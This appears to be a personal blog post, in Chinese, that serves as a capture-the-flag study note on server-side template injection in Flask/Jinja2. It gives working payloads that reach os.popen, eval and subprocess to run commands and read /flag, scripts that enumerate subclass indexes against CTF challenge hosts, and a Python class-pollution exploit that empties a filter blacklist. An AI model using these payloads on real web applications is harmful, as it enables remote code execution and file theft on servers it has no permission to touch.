@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Zbaoabo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="SSTI[TOC] 一、概念SSTI 就是服务器端模板注入（Server-Side Template Injection）实际上也是一种注入漏洞  1.原因渲染模板时，没有严格控制队用户的输入； 2.影响可能早晨给人以文件读取和RCE远程控制后台系统  二、继承关系和魔术方法魔术方法1.class_   #查找当前类型的所属对象 2.base_   #沿着父子类的关系往上走一个 3.mro_">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Zbaoabo">
+<meta property="og:url" content="http://example.com/2025/03/13/SSTI/index.html">
+<meta property="og:site_name" content="Zbaoabo">
+<meta property="og:description" content="SSTI[TOC] 一、概念SSTI 就是服务器端模板注入（Server-Side Template Injection）实际上也是一种注入漏洞  1.原因渲染模板时，没有严格控制队用户的输入； 2.影响可能早晨给人以文件读取和RCE远程控制后台系统  二、继承关系和魔术方法魔术方法1.class_   #查找当前类型的所属对象 2.base_   #沿着父子类的关系往上走一个 3.mro_">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/SSTI/image-20250313194130217.png">
+<meta property="og:image" content="http://example.com/SSTI/image-20250526202625157.png">
+<meta property="article:published_time" content="2025-03-13T11:09:59.320Z">
+<meta property="article:modified_time" content="2025-09-15T12:29:13.128Z">
+<meta property="article:author" content="zhangsuhong">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/SSTI/image-20250313194130217.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Zbaoabo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">zhangsuhong</a></h1>
+		</hgroup>
+
+		
+			<p class="header-subtitle"></p>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-SSTI" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/03/13/SSTI/" class="article-date">
+  	<time datetime="2025-03-13T11:09:59.320Z" itemprop="datePublished">2025-03-13</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>[TOC]</p>
+<h2 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h2><p>SSTI 就是服务器端模板注入（Server-Side Template Injection）实际上也是一种注入漏洞 </p>
+<h3 id="1-原因"><a href="#1-原因" class="headerlink" title="1.原因"></a>1.原因</h3><p>渲染模板时，没有严格控制队用户的输入；</p>
+<h3 id="2-影响"><a href="#2-影响" class="headerlink" title="2.影响"></a>2.影响</h3><p>可能早晨给人以文件读取和RCE远程控制后台系统</p>
+<p><img src="/SSTI/image-20250313194130217.png" alt="image-20250313194130217"></p>
+<h2 id="二、继承关系和魔术方法"><a href="#二、继承关系和魔术方法" class="headerlink" title="二、继承关系和魔术方法"></a>二、继承关系和魔术方法</h2><h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h4><p>1.<em>class</em>_   #查找当前类型的所属对象</p>
+<p>2.<em>base</em>_   #沿着父子类的关系往上走一个</p>
+<p>3.<em>mro</em>_     #查找当前类对象的所有继承类</p>
+<p>4.<em>subclasses</em>_  #查找父类下的所有子类</p>
+<p>5.<em>init</em>_       #查看类是否重载，重载是指程序在运行时就已经加载好了这个模块到内存中，如果出现wrapper字眼，说明没有重载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">__class__            类的一个内置属性，表示实例对象的类。</span><br><span class="line">__base__             类型对象的直接基类</span><br><span class="line">__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__</span><br><span class="line">__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br><span class="line">__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.</span><br><span class="line">__init__             初始化类，返回的类型是function</span><br><span class="line">__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line">__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line"></span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()</span><br><span class="line">request.args.x1   	 get传参</span><br><span class="line">request.values.x1 	 所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data  		 post传参	(Content-Type:a/b)</span><br><span class="line">request.json		 post传json  (Content-Type: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br><span class="line">g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#x27;flask_ssti&#x27;&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="三、模板"><a href="#三、模板" class="headerlink" title="三、模板"></a>三、模板</h2><h4 id="1-warning类"><a href="#1-warning类" class="headerlink" title="1.warning类"></a>1.warning类</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from tqdm import tqdm</span><br><span class="line"> </span><br><span class="line">for i in tqdm(range(233)):</span><br><span class="line">    url = &#x27;http://9f7c273f-592e-4f44-bec2-fcc399bdf13a.challenge.ctf.show/?name=&#123;&#123;[].__class__.__base__.__subclasses__()[&#x27; + str(</span><br><span class="line">        i) + &#x27;]&#125;&#125;&#x27;</span><br><span class="line">    r = requests.get(url=url).text</span><br><span class="line">    if (&#x27;warnings.catch_warnings&#x27; in r):</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;[].__class__.__base__.__subclasses__()[185].__init__.__globals__.__builtins__[&#x27;eval&#x27;]&#125;&#125;</span><br><span class="line"> ?name=&#123;&#123;[].__class__.__base__.__subclasses__()[185].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</span><br><span class="line">  ?name=&#123;&#123;[].__class__.__base__.__subclasses__()[185].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-os类"><a href="#2-os类" class="headerlink" title="2.os类"></a>2.os类</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from tqdm import tqdm</span><br><span class="line"> </span><br><span class="line">for i in tqdm(range(233)):</span><br><span class="line">    url = &#x27;http://4a452e3b-87c0-4333-b0de-5988c9699010.challenge.ctf.show/?name=&#123;&#123;[].__class__.__base__.__subclasses__()[&#x27; + str(</span><br><span class="line">        i) + &#x27;].__init__.__globals__&#125;&#125;&#x27;</span><br><span class="line">    r = requests.get(url=url).text</span><br><span class="line">    if (&#x27;os&#x27; in r):</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()</span><br><span class="line">__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()</span><br><span class="line">__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="3-popen类"><a href="#3-popen类" class="headerlink" title="3.popen类"></a>3.popen类</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from tqdm import tqdm</span><br><span class="line"> </span><br><span class="line">for i in tqdm(range(233)):</span><br><span class="line">    url = &#x27;http://4a452e3b-87c0-4333-b0de-5988c9699010.challenge.ctf.show/?name=&#123;&#123;[].__class__.__base__.__subclasses__()[&#x27; + str(</span><br><span class="line">        i) + &#x27;].__init__.__globals__&#125;&#125;&#x27;</span><br><span class="line">    r = requests.get(url=url).text</span><br><span class="line">    if (&#x27;popen&#x27; in r):</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-importlib类"><a href="#4-importlib类" class="headerlink" title="4.importlib类"></a>4.importlib类</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from tqdm import tqdm</span><br><span class="line"> </span><br><span class="line">for i in tqdm(range(233)):</span><br><span class="line">    url = &#x27;http://4a452e3b-87c0-4333-b0de-5988c9699010.challenge.ctf.show/?name=&#123;&#123;[].__class__.__base__.__subclasses__()[&#x27; + str(</span><br><span class="line">        i) + &#x27;]&#125;&#125;&#x27;</span><br><span class="line">    r = requests.get(url=url).text</span><br><span class="line">    if (&#x27;_frozen_importlib.BuiltinImporter&#x27; in r):</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;[].__class__.__base__.__subclasses__()[84].[&quot;load_module&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;ls /&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>####5.linecache函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from tqdm import tqdm</span><br><span class="line"> </span><br><span class="line">for i in tqdm(range(233)):</span><br><span class="line">    url = &#x27;http://4a452e3b-87c0-4333-b0de-5988c9699010.challenge.ctf.show/?name=&#123;&#123;[].__class__.__base__.__subclasses__()[&#x27; + str(</span><br><span class="line">        i) + &#x27;].__init__.__globals__&#125;&#125;&#x27;</span><br><span class="line">    r = requests.get(url=url).text</span><br><span class="line">    if (&#x27;linecache&#x27; in r):</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;[].__class__.__base__.__subclasses__()[&#x27;&#x27;].__init__.__globals__[&#x27;linecache&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()</span><br></pre></td></tr></table></figure>
+
+<p>####6.subprocess.Popen</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from tqdm import tqdm</span><br><span class="line"> </span><br><span class="line">for i in tqdm(range(233)):</span><br><span class="line">    url = &#x27;http://4a452e3b-87c0-4333-b0de-5988c9699010.challenge.ctf.show/?name=&#123;&#123;[].__class__.__base__.__subclasses__()[&#x27; + str(</span><br><span class="line">        i) + &#x27;].__init__.__globals__&#125;&#125;&#x27;</span><br><span class="line">    r = requests.get(url=url).text</span><br><span class="line">    if (&#x27;subprocess.Popen&#x27; in r):</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;[].__class__.__base__.__subclasses__()[&#x27;&#x27;](&#x27;ls /&#x27;,shell=True,stdout=-1).communicate()[0].strip()</span><br></pre></td></tr></table></figure>
+
+<h4 id="7-万能模板（ipsum-和-cycler-执行命令不需要索引）"><a href="#7-万能模板（ipsum-和-cycler-执行命令不需要索引）" class="headerlink" title="7.万能模板（ipsum 和 cycler 执行命令不需要索引）"></a>7.万能模板（<strong>ipsum</strong> 和 cycler 执行命令不需要索引）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;lipsum.__globals__.os.popen(&#x27;ls /&#x27;).read()&#125;&#125;  也行</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;cycler.__init__.__globals__.os.popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、焚靖"><a href="#四、焚靖" class="headerlink" title="四、焚靖"></a>四、焚靖</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fenjing webui</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m fenjing webui</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、wp"><a href="#五、wp" class="headerlink" title="五、wp"></a>五、wp</h2><p><img src="/SSTI/image-20250526202625157.png" alt="image-20250526202625157"></p>
+<p>访问&#x2F;flag路由，提示要post提交一个四位数，使用burp爆破数值爆破</p>
+<p>爆破得到一个长度不一样的，发现有东西，还是python原型链污染</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">BLACKLIST_IN_index = [&#x27;&#123;&#x27;,&#x27;&#125;&#x27;]</span><br><span class="line">def merge(src, dst):</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line">@app.route(&#x27;/magic&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def pollute():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        if request.is_json:</span><br><span class="line">            merge(json.loads(request.data), instance)</span><br><span class="line">            return &quot;这个魔术还行吧&quot;</span><br><span class="line">        else:</span><br><span class="line">            return &quot;我要json的魔术&quot;</span><br><span class="line">    return &quot;记得用POST方法把魔术交上来&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line"> </span><br><span class="line"># 目标URL</span><br><span class="line">url = &quot;http://challenge.basectf.fun:42857/magic&quot;</span><br><span class="line"> </span><br><span class="line"># 构造包含特殊键的 JSON 数据</span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__class__&quot;:&#123;</span><br><span class="line">        &quot;__init__&quot;:&#123;</span><br><span class="line">            &quot;__globals__&quot;:&#123;</span><br><span class="line">                &quot;BLACKLIST_IN_index&quot; : []</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"># 将 JSON 数据转换为字符串</span><br><span class="line">payload_json = json.dumps(payload)</span><br><span class="line">print(payload_json)</span><br><span class="line"> </span><br><span class="line"># 发送 POST 请求</span><br><span class="line">response = requests.post(url, data=payload_json, headers=&#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;)</span><br><span class="line"> </span><br><span class="line"># 打印响应内容</span><br><span class="line">print(&quot;Status Code:&quot;, response.status_code)</span><br><span class="line">print(&quot;Response Content:&quot;, response.text)</span><br></pre></td></tr></table></figure>
+
+<p><strong>运行结束后，就可以在index路由进行模版注入了，payload如下：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/03/13/php/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/03/11/SSRF/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2025 zhangsuhong
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
